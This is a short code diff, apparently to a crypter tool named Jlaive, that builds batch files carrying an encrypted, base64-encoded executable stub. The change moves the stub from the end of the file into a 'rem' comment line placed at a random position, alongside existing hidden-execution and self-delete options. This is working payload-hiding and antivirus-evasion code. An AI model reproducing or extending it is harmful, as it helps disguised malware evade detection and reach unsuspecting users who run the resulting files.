@@ -175,7 +175,9 @@ namespace Jlaive
 
             listBox2.Items.Add("Creating batch file...");
             string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, rng);
-            content += Convert.ToBase64String(stub_enc);
+            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
+            content_lines.Insert(rng.Next(0, content_lines.Count), "rem " + Convert.ToBase64String(stub_enc));
+            content = string.Join(Environment.NewLine, content_lines);
 
             SaveFileDialog sfd = new SaveFileDialog()
             {
